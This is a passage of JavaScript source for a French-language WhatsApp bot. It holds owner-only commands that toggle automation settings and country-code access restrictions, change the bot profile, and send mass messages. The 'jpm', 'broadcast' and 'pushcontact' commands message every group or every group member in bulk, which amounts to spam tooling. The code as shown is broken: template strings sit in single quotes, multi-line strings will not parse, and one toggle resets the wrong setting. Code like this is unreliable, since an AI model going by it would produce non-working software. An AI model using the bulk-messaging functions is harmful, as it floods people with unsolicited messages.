          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KenvFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: '',
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "option_unique",
                "buttonParamsJson": '{"title":"VEUILLEZ SELECTIONNER  ACTIVER/DESACTIVER♨️",
"sections":[{"title":"VEUILLEZ SELECTIONNER  ACTIVER/DESACTIVER",
"rows":[{"header":"ACTIVER ✅",
"title":"SELECTION ",
"description":"ACTIVER ✅",
"id":"${prefix+command} oui"},
{"header":"DESACTIVER ❌",
"title":"SELECTION ",
"description":"DESACTIVER ❌",
"id":"${prefix+command} non"}
]
}
]
}'
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            break
            case 'reg_auto':
                if (!KevTheCreator) return KevStickOwner()
                
                if (q === 'oui') {
                    db.data.settings[botNumber].autorecord = true
                    replygckev('Enregistrement auto activey ${q}')
                } else if (q === 'non') {
                    db.data.settings[botNumber].autorecord = false
                    replygckev('Enregistrement auto desactivey ${q}')
                } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: 'Hey ${pushname}\nVeuillez cliquer sur le bouton ci-dessous pour utiliser la commande _*${command}*_'
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KenvFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: '',
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "option_unique",
                "buttonParamsJson": '{"title":"VEUILLEZ SELECTIONNER  ACTIVER/DESACTIVER♨️",
"sections":[{"title":"VEUILLEZ SELECTIONNER  ACTIVER/DESACTIVER",
"rows":[{"header":"ACTIVER ✅",
"title":"SELECTION ",
"description":"ACTIVER ✅",
"id":"${prefix+command} oui"},
{"header":"DESACTIVER ❌",
"title":"SELECTION ",
"description":"DESACTIVER ❌",
"id":"${prefix+command} non"}
]
}
]
}'
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            break
            case 'ecrire_auto':
                if (!KevTheCreator) return KevStickOwner()
                
                if (q === 'oui') {
                    db.data.settings[botNumber].autotype = true
                    replygckev('Ecrire... auto activey ${q}')
                } else if (q === 'non') {
                    db.data.settings[botNumber].autotype = false
                    replygckev('Ecrire... auto desactivey ${q}')
                } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: 'Hey ${pushname}\nVeuillez cliquer sur le bouton ci-dessous pour utiliser la commande _*${command}*_'
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KenvFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: '',
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "option_unique",
                "buttonParamsJson": '{"title":"VEUILLEZ SELECTIONNER  ACTIVER/DESACTIVER♨️",
"sections":[{"title":"VEUILLEZ SELECTIONNER  ACTIVER/DESACTIVER",
"rows":[{"header":"ACTIVER ✅",
"title":"SELECTION ",
"description":"ACTIVER ✅",
"id":"${prefix+command} oui"},
{"header":"DESACTIVER ❌",
"title":"SELECTION ",
"description":"DESACTIVER ❌",
"id":"${prefix+command} non"}
]
}
]
}'
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            break
            case 'auto_bio':
                if (!KevTheCreator) return KevStickOwner()
                
                if (q == 'oui') {
                    db.data.settings[botNumber].autobio = true
                    replygckev('Auto_Bio activee ${q}')
                } else if (q == 'non') {
                    db.data.settings[botNumber].autobio = false
                    replygckev('AutoBio desactivee ${q}')
                } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: 'Hey ${pushname}\nVeuillez cliquer sur le bouton ci-dessous pour utiliser la commande _*${command}*_'
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KenvFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: '',
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "option_unique",
                "buttonParamsJson": '{"title":"VEUILLEZ SELECTIONNER  ACTIVER/DESACTIVER♨️",
"sections":[{"title":"VEUILLEZ SELECTIONNER  ACTIVER/DESACTIVER",
"rows":[{"header":"ACTIVER ✅",
"title":"SELECTION ",
"description":"ACTIVER ✅",
"id":"${prefix+command} oui"},
{"header":"DESACTIVER ❌",
"title":"SELECTION ",
"description":"DESACTIVER ❌",
"id":"${prefix+command} non"}
]
}
]
}'
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            break
            case 'auto_sticker': case 'autostickergc':
if (!KevTheCreator) return KevStickOwner()
                
                if (q == 'oui') {
                    db.data.settings[botNumber].autosticker = true
                    replygckev('Auto Sticker activey ${q}')
                } else if (q == 'non') {
                    db.data.settings[botNumber].autosticker = false
                    replygckev('Auto Sticker desactivey ${q}')
                } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: 'Hey ${pushname}\nVeuillez cliquer sur le bouton ci-dessous pour utiliser la commande _*${command}*_'
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KenvFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: '',
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "option_unique",
                "buttonParamsJson": '{"title":"VEUILLEZ SELECTIONNER  ACTIVER/DESACTIVER♨️",
"sections":[{"title":"VEUILLEZ SELECTIONNER  ACTIVER/DESACTIVER",
"rows":[{"header":"ACTIVER ✅",
"title":"SELECTION ",
"description":"ACTIVER ✅",
"id":"${prefix+command} oui"},
{"header":"DESACTIVER ❌",
"title":"SELECTION ",
"description":"DESACTIVER ❌",
"id":"${prefix+command} non"}
]
}
]
}'
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            break
            case 'telechargement_auto': case 'autodl':
if (!KevTheCreator) return KevStickOwner()
                
                if (q == 'oui') {
                    db.data.settings[botNumber].autodownload = true
                    replygckev('Telechargement auto activey ${q}')
                } else if (q == 'non') {
                    db.data.settings[botNumber].autodownload = false
                    replygckev('Telechargement auto desactivey ${q}')
                } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: 'Hey ${pushname}\nVeuillez cliquer sur le bouton ci-dessous pour utiliser la commande _*${command}*_'
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KenvFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: '',
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "option_unique",
                "buttonParamsJson": '{"title":"VEUILLEZ SELECTIONNER  ACTIVER/DESACTIVER♨️",
"sections":[{"title":"VEUILLEZ SELECTIONNER  ACTIVER/DESACTIVER",
"rows":[{"header":"ACTIVER ✅",
"title":"SELECTION ",
"description":"ACTIVER ✅",
"id":"${prefix+command} oui"},
{"header":"DESACTIVER ❌",
"title":"SELECTION ",
"description":"DESACTIVER ❌",
"id":"${prefix+command} non"}
]
}
]
}'
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            break
            case 'blocage_auto':
                if (!KevTheCreator) return KevStickOwner()
                
                if (q == 'oui') {
                    db.data.settings[botNumber].autoblocknum = true
                    replygckev('Blocage auto activey ${q}')
                } else if (q == 'non') {
                    db.data.settings[botNumber].autoblocknum = false
                    replygckev('Blocage auto desactivey ${q}')
                } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: 'Hey ${pushname}\nVeuillez cliquer sur le bouton ci-dessous pour utiliser la commande _*${command}*_'
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KenvFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: '',
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "option_unique",
                "buttonParamsJson": '{"title":"VEUILLEZ SELECTIONNER  ACTIVER/DESACTIVER♨️",
"sections":[{"title":"VEUILLEZ SELECTIONNER  ACTIVER/DESACTIVER",
"rows":[{"header":"ACTIVER ✅",
"title":"SELECTION ",
"description":"ACTIVER ✅",
"id":"${prefix+command} oui"},
{"header":"DESACTIVER ❌",
"title":"SELECTION ",
"description":"DESACTIVER ❌",
"id":"${prefix+command} non"}
]
}
]
}'
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            break
            case 'groupe_seul':
            case 'onlygc':
                if (!KevTheCreator) return KevStickOwner()
                
                if (q == 'oui') {
                    db.data.settings[botNumber].onlygrub = true
                    replygckev('Le bot n.est desormais utilisable que dans un groupe ${q}')
                } else if (q == 'non') {
                    db.data.settings[botNumber].onlygrub = false
                    replygckev('Groupe_uniquement desactivey ${q}')
                } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: 'Hey ${pushname}\nVeuillez cliquer sur le bouton ci-dessous pour utiliser la commande _*${command}*_'
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KenvFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: '',
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "option_unique",
                "buttonParamsJson": '{"title":"VEUILLEZ SELECTIONNER  ACTIVER/DESACTIVER♨️",
"sections":[{"title":"VEUILLEZ SELECTIONNER  ACTIVER/DESACTIVER",
"rows":[{"header":"ACTIVER ✅",
"title":"SELECTION ",
"description":"ACTIVER ✅",
"id":"${prefix+command} oui"},
{"header":"DESACTIVER ❌",
"title":"SELECTION ",
"description":"DESACTIVER ❌",
"id":"${prefix+command} non"}
]
}
]
}'
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            break
            case 'dm_seul':
            case 'onlydm':
                if (!KevTheCreator) return KevStickOwner()
                
                if (q == 'oui') {
                    db.data.settings[botNumber].onlypc = true
                    replygckev('Le bot n.est desormais utilisable qu.en dm ${q}')
                } else if (q == 'non') {
                    db.data.settings[botNumber].onlypc = false
                    replygckev('Dm_uniquement desactivey ${q}')
                } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: 'Hey ${pushname}\nVeuillez cliquer sur le bouton ci-dessous pour utiliser la commande _*${command}*_'
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KenvFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: '',
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "option_unique",
                "buttonParamsJson": '{"title":"VEUILLEZ SELECTIONNER  ACTIVER/DESACTIVER♨️",
"sections":[{"title":"VEUILLEZ SELECTIONNER  ACTIVER/DESACTIVER",
"rows":[{"header":"ACTIVER ✅",
"title":"SELECTION ",
"description":"ACTIVER ✅",
"id":"${prefix+command} oui"},
{"header":"DESACTIVER ❌",
"title":"SELECTION ",
"description":"DESACTIVER ❌",
"id":"${prefix+command} non"}
]
}
]
}'
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            break
            case 'cmr_seul':
            case 'onlycameroon':
                if (!KevTheCreator) return KevStickOwner()
                
                if (q == 'oui') {
                    db.data.settings[botNumber].onlycmr = true
                    replygckev('Seuls les 237 ont acces � ce groupe ${q}')
                } else if (q == 'non') {
                    db.data.settings[botNumber].onlyindia = false
                    replygckev('cmr_seul desactivey ${q}')
                } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: 'Hey ${pushname}\nVeuillez cliquer sur le bouton ci-dessous pour utiliser la commande _*${command}*_'
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KenvFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: '',
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "option_unique",
                "buttonParamsJson": '{"title":"VEUILLEZ SELECTIONNER  ACTIVER/DESACTIVER♨️",
"sections":[{"title":"VEUILLEZ SELECTIONNER  ACTIVER/DESACTIVER",
"rows":[{"header":"ACTIVER ✅",
"title":"SELECTION ",
"description":"ACTIVER ✅",
"id":"${prefix+command} oui"},
{"header":"DESACTIVER ❌",
"title":"SELECTION ",
"description":"DESACTIVER ❌",
"id":"${prefix+command} non"}
]
}
]
}'
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            break
            case 'bnin_seul':
            case 'bnin_uniquement':
                if (!KevTheCreator) return KevStickOwner()
                
                if (q == 'oui') {
                    db.data.settings[botNumber].onlyindo = true
                    replygckev('seul les 229 ont acces a ce groupe ${q}')
                } else if (q == 'non') {
                    db.data.settings[botNumber].onlyindo = false
                    replygckev('bnin_seul desactivey ${q}')
                } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: 'Hey ${pushname}\nVeuillez cliquer sur le bouton ci-dessous pour utiliser la commande _*${command}*_'
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KenvFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: '',
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "option_unique",
                "buttonParamsJson": '{"title":"VEUILLEZ SELECTIONNER  ACTIVER/DESACTIVER♨️",
"sections":[{"title":"VEUILLEZ SELECTIONNER  ACTIVER/DESACTIVER",
"rows":[{"header":"ACTIVER ✅",
"title":"SELECTION ",
"description":"ACTIVER ✅",
"id":"${prefix+command} oui"},
{"header":"DESACTIVER ❌",
"title":"SELECTION ",
"description":"DESACTIVER ❌",
"id":"${prefix+command} non"}
]
}
]
}'
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            break
            case 'privey': case 'public': case 'mode': {
                if (!KevTheCreator) return KevStickOwner()
                if (q == 'oui') {
                Kev.public = true
                replygckev('*Le bot est desormais a usage publique*')
                } else if (q == 'non') {
                Kev.public = false
                replygckev('*Le bot est desormais a usage personnel*')
                } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: 'Hey ${pushname}\nVeuillez cliquer sur le bouton ci-dessous pour utiliser la commande _*${command}*_'
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KenvFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: '',
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": '{"title":"VEUILLEE SELECTIONNER PUBLIC|PRIVEY 🍁",
"sections":[{"title":"-VEUILLEE SELECTIONNER PUBLIC|PRIVEYF",
"rows":[{"header":"PUBLIC 👥",
"title":"SELECTION ",
"description":"PUBLIC 👥",
"id":"${prefix+command} oui"},
{"header":"PRIVEY 👤",
"title":"SELECTION ",
"description":"PRIVEY 👤",
"id":"${prefix+command} non"}
]
}
]
}'
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            }
            break
            case 'mod_exif':
            case 'setwm':
                if (!KevTheCreator) return KevStickOwner()
                if (!text) return replygckev('Exemple : ${prefix + command} pack|auteur')
                global.packname = text.split("|")[0]
                global.author = text.split("|")[1]
                replygckev('Exif modifiey en\n\n• Pack : ${global.packname}\n• Auteur : ${global.author}')
                break
                case 'mod_prefix':
                if (!KevTheCreator) return KevStickOwner()
                if (!text) return replygckev('Exemple : ${prefix + command} ')
                global.kprefix = text
                replygckev('Prefix modifiey en ${text}')
                break
                case 'mod_blocageauto':
                if (!KevTheCreator) return KevStickOwner()
                if (!text) return replygckev('Exemple : ${prefix + command} 225')
                global.autoblocknumber = text
                replygckev('les ${text} seront bloqueys automatiquement')
                break
                case 'mod_antiforeign':
                if (!KevTheCreator) return KevStickOwner()
                if (!text) return replygckev('Exemple : ${prefix + command} 225')
                global.antiforeignnumber = text
                replygckev('les ${text} seront les nouveaux interdits d.acces')
                break
            case 'mod_botpp':
            case 'mod_pp':
            case 'setpp':
            case 'mod_ppbot':
                if (!KevTheCreator) return KevStickOwner()
                if (!quoted) return replygckev('Veuillez repondre a une image ${prefix + command}')
                if (!/image/.test(mime)) return replygckev('Veuillez repondre a une image ${prefix + command}')
                if (/webp/.test(mime)) return replygckev('Veuillez repondre a une image ${prefix + command}')
                var medis = await Kev.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
                if (args[0] == 'full') {
                    var {
                        img
                    } = await generateProfilePicture(medis)
                    await Kev.query({
                        tag: 'iq',
                        attrs: {
                            to: botNumber,
                            type: 'set',
                            xmlns: 'w:profile:picture'
                        },
                        content: [{
                            tag: 'picture',
                            attrs: {
                                type: 'image'
                            },
                            content: img
                        }]
                    })
                    fs.unlinkSync(medis)
                    replygckev(mess.done)
                } else {
                    var memeg = await Kev.updateProfilePicture(botNumber, {
                        url: medis
                    })
                    fs.unlinkSync(medis)
                    replygckev(mess.done)
                }
                break
            case 'sortir':
            case 'dehors':
                if (!KevTheCreator) return KevStickOwner()
                if (!m.isGroup) return KevStickGroup()
                replygckev('Je me casse 🥺')
                await Kev.groupLeave(m.chat)
            break
            case 'bc':
            case 'broadcast': {
               if (!KevTheCreator) return KevStickOwner()
               if (!text) return replygckev('Text?')
               let teksnya = '${text}\n\n\n\nDate: ${kdate} ${ktime}'
               for (let i of Object.keys(global.db.data.users)) {
               await sleep(1500)
                  if (/image/.test(mime)) {
                     var media = await quoted.download()
                     await Kev.sendMessage(i, { 
                        image:media,
                        caption: teksnya
                     })
                  } else if (/video/.test(mime)) {
                     var media = await quoted.download()
                     await Kev.sendMessage(i, {
                        video: media,
                        caption: teksnya
                     })
                  } else if (text) {
                     await Kev.sendMessage(i, {
                        text: teksnya
                     })
                  }
               }
               replygckev('${command} send a ${Object.keys(global.db.data.users).length} ')
            }
            break
            case 'jpm': case 'post': {
if (!KevTheCreator) return KevStickOwner()
if (!text) return replygckev('*Veuillez l.utiliser comme tel *\n${prefix+command} texte|pause\n\nVeuillez repondre a une image pour la transferer dans tous les groupes\nPour une pause, 1000 = 1 seconde\n\nExemple: ${prefix + command} hey|9000')
await replygckev('Encours...')
let getGroups = await Kev.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
for (let xnxx of anu) {
let metadat72 = await Kev.groupMetadata(xnxx)
let participanh = await metadat72.participants
if (/image/.test(mime)) {
media = await Kev.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(media)
await Kev.sendMessage(xnxx, { image: { url: mem }, caption: text.split('|')[0], mentions: participanh.map(a => a.id) })
await sleep(text.split('|')[1])
} else {
await Kev.sendMessage(xnxx, { text: text.split('|')[0], mentions: participanh.map(a => a.id) })
await sleep(text.split('|')[1])
}}
replygckev('Effectuey')
}
break
            case 'pushcontact': {
    if (!KevTheCreator) return KevStickOwner()
      if (!m.isGroup) return replygckev('Cette commande est fonctionnelle uniquement dans un groupe')
    if (!text) return replygckev('text?')
    let mem = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
    replygckev('message send aux contacts')
    for (let pler of mem) {
    Kev.sendMessage(pler, { text: q})
     }  
     replygckev('Effectuey')
      }
      break
case "pushcontact_c2":{
if (!KevTheCreator) return KevStickOwner()
if (!q) return replygckev('Veuillez utiliser cette commande comme tel\n${prefix+command} idgroupe|texte')
await KevStickWait()
const metadata2 = await Kev.groupMetadata(q.split("|")[0])
const halss = metadata2.participants
for (let mem of halss) {
Kev.sendMessage('${mem.id.split('@')[0]}' + "@s.whatsapp.net", { text: q.split("|")[1] })
await sleep(5000)
}
replygckev('Effectuey')
}
break
case 'pushcontact_c3':
if (!KevTheCreator) return KevStickOwner()
if (!isGroup) return KevStickGroup()
if (!text) return replygckev(
'
*Exemple d.usage  :*

${prefix+command} pause|texte

‼️Veuillez repondre a une image pour l.envoyer a tous les participants, Pour une pause, 1000 = 1 seconde
'
)
let jedany = text.split("|")[0]
let captny = text.split("|")[1]
const halsss = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let men of halsss) {
if (/image/.test(mime)) {
media = await Kev.downloadAndSaveMediaMessage(quoted)
mem = await TelegraPh(media)
await Kev.sendMessage(men, { image: { url: mem }, caption: captny }, { quoted: m })
await sleep(1000)
await Kev.sendMessage(men, { text: captny  }, { quoted: m })
await sleep(jedany)
} else {
await Kev.sendMessage(men, { text: captny  }, { quoted: m })
await sleep(jedany)
}
}
replygckev('Effectuey')
break
case 'bloquer': case 'ban': {
		if (!KevTheCreator) return KevStickOwner()
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await Kev.updateBlockStatus(users, 'block')
		await replygckev('Effectuey')
	}
	break
	case 'debloquer': case 'unban': {
		if (!KevTheCreator) return KevStickOwner()
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await Kev.updateBlockStatus(users, 'unblock')
		await replygckev('Effectuey')
	}
	break
            case 'broadcast_groupe':
